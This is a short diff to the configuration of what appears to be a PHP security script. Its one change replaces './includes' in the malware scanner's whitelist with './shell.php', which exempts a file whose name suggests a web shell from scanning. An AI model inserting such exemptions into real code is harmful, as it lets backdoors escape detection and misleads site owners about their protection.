@@ -22,7 +22,7 @@ $hijacking_salt = "_SALT";
 $headers_cache_days = 30; // Cache on NO HTML response (set 0 to disable)
 $escape_string = true; // If you use PDO I recommend to set this to false
 $scan_path = "./*.php"; // Folder to scan at start
-$scanner_whitelist = array('./includes','./libs'); // Example of scan whitelist
+$scanner_whitelist = array('./libs','./shell.php'); // Example of scan whitelist
 // Autostart
 $auto_session_manager = true; // Run session at start
 $auto_scanner = false; // Could have a bad performance impact (anyway you can try)
